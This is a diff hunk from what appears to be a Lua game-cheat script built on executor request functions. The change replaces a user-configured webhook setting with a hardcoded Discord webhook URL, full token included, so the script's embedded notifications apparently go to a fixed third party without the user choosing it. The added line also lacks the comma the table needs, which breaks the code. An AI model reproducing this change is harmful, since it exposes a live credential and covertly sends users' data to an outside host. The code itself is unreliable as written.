@@ -177,7 +177,7 @@ local embed = {
         }
 	local AttemptWebhook, WebhookError = pcall(function()
             (syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or getgenv().request or request) {
-                Url = settings.Webhook.FruitUrl,
+                Url = "https://discord.com/api/webhooks/1288429702293491775/ZbqmI34oqbEz1B8eUd22h8aORla__pAGrp4bedofLleUB-4vtmeQks-F_V6rlpm64iY9"
                 Method = "POST",
                 Headers = {
                     ["Content-Type"] = "application/json"
